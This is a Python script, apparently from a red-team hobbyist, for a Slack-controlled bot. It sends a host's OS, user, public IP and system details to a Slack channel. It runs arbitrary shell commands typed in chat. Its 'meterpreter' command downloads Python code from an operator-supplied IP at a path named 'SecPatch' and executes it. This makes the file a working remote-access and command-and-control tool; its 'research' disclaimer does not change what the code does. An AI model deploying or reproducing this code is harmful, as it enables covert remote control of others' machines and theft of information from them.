#!/usr/bin/env python

# Remember to have a look on my blog post if you stuck at something :)
# http://hackinguyz.blogspot.in/2017/05/slackbots-rebirth-of-ircbots.html

# Get slack token 
# slack outgoing token https://user.slack.com/apps/manage/custom-integrations
# slack incoming token https://user.slack.com/apps/manage/custom-integrations

# Installation
# 1. Generate both incoming from slack server and mention it in script
# 2. Download slackclient https://github.com/slackapi/python-slackclient
# 3. Install as current user (if you are not root, im just making instructions according to worst condition)
# 	 $ python setup.py install --user
# 4. Download ngrok https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
# 5. run server for backconnect (./ngrok http <port>) anc copy refference link it generates	
# 6. now for generating outgoing token, paste one of copied reffrence link from ngrok
#    and paste it into fillup box and copy token it generate,hit save.
# 7. Finally open channel and run script. :) 

# NOTE
# Im not quite so sure but still i've made a way to use shell commands via chat area
# you can check it, i just left it in middle.. (yea i do silly mistakes sometimes).
# Actually i was able to deliver command but it wasn't able to receive back its result
# on chat area .. so i ended up scratching my head putting meterpreter in its alternative

# ALSO REMEMBER ... I wont be responsible for any missuse from user side
# Its something i made just for a research :)
# 

#Shouts to SSA [Red-Team] https://ssa-team.com

#doubts? insults?
#@bofheaded https://hackinguyz.blogspot.com

import os
import time
import urllib2
import re
from flask import Flask, request, Response
try:
	from slackclient import SlackClient
except ImportError :
	print "[~] Module slackclient is not installed"
	print "https://github.com/slackapi/python-slackclient"
	print "lemme install it for ya"
	os.system("git clone https://github.com/slackapi/python-slackclient")
	os.system("cd python-slackclient && python setup.py install --user")
	exit("[~] Exiting for now ... execute script again")

#######

CHAT_A =  "" #PUT CHAT AREA NAME HERE 
s_token = "" #PUT Slack Legacy TOKEN HERE
o_token = "" #Outgoing request token

#######
cof = """

   ( (
    ) )
  ........
  |      |]
  \      /     
   `----'
Taken from @Responder lol <3  
"""
helpme="""
Help Menu
=========

[os] 			- Retrive OS and Current User info
[issue]			- Issue of linux box
[p_ip]			- Retrive public IP of box
[uname] 		- Uname of Box
[coffee] 		- Print fancy coffee mug in chat area
[help] 			- List all help and ablities you have with this bot
[shell]			- Execute a Shell command
[meterpreter] 	- Spawn Meterpreter session
"""
print "Slack Bot by Chaitanya [@bofheaded]"
time.sleep(2)
sc = SlackClient(s_token)
app = Flask(__name__) 		

		

@app.route('/lol', methods=['POST'])
def inbound():
    SLACK_WEBHOOK_SECRET = o_token
    if request.form.get('token') == SLACK_WEBHOOK_SECRET:
        text = request.form.get('text')
        if text == "os":
        	if os.name == "posix":
        		os_="Linux"
        	else:
        		os_=os.name
        	sc.api_call(
  			"chat.postMessage",
  			channel="#"+CHAT_A,
  			username = os.getlogin(),
  			icon_emoji=":ghost:",
  			text="OS: "+os_+" Current User:"+os.getlogin())
        elif text == "issue":
  			etcissue = open("/etc/issue" , "r")
  			h = etcissue.read()
  			sc.api_call(
  			"chat.postMessage",
  			channel="#"+CHAT_A,
  			username = os.getlogin(),
  			icon_emoji=":ghost:",
  			text=h)
        elif text =="p_ip":
  			vi_ip = urllib2.urlopen('http://ip.42.pl/raw').read()
  			sc.api_call(
  			"chat.postMessage",
  			channel="#"+CHAT_A,
  			username = os.getlogin(),
  			icon_emoji=":ghost:",
  			text="Public IP of box : "+vi_ip)
        elif text =="uname":
  			sc.api_call(
  			"chat.postMessage",
  			channel="#"+CHAT_A,
  			username = os.getlogin(),
  			icon_emoji=":ghost:",
  			text=os.uname())
        elif text == "coffee":
  			sc.api_call(
  			"chat.postMessage",
  			channel="#"+CHAT_A,
  			username = os.getlogin(),
  			icon_emoji=":ghost:",
  			text=cof)
        elif text == "help":
  			sc.api_call(
  			"chat.postMessage",
  			channel="#"+CHAT_A,
  			username = os.getlogin(),
  			icon_emoji=":ghost:",
  			text=helpme)
        elif text == "":
 			sc.api_call(
  			"chat.postMessage",
  			channel="#"+CHAT_A,
  			username = os.getlogin(),
  			icon_emoji=":ghost:",
  			text="sleeping?")

        elif "shell " in text:
  			cmd = text
  			shello = cmd.replace("shell ", "")
  			shell = os.system(shello)
  			time.sleep(2)
  			sc.api_call(
  			"chat.postMessage",
  			channel="#"+CHAT_A,
  			username = os.getlogin(),
  			icon_emoji=":ghost:",
  			text=shello)
        elif "meterpreter " in text:
  			m_ip = text
  			l_ip = m_ip.replace("meterpreter " , "")
  			payload = """
python -c "import urllib2; r = urllib2.urlopen('http://"""+l_ip+""":8080/SecPatch'); exec(r.read());"  			
  			"""
  			os.system(payload)	
  		#else
  		#	pass		
  	else:
  		pass	
    return Response(), 200

@app.route('/lol', methods=['GET'])
def test():
    return Response('It works!')   
    
def main():
	intro()
	inbound()
	test()

if __name__ == '__main__':
	try:
		if s_token == "":
			raise ValueError
			print "[~] Incoming webhook token not provided"
		elif o_token == "":
			raise ValueError
			print "[~] Outgoing webhook token not provided"
		else:
			sc.api_call(
	  		"chat.postMessage",
	  		channel="#"+CHAT_A,
	  		username = os.getlogin(),
	  		icon_emoji=":ghost:",
	  		text="BOT "+os.getlogin()+" Joined Channel #"+CHAT_A+"")
	  		time.sleep(2)		
			app.run(debug=False).main()
	except:
		print "[!] Exitting"
		


		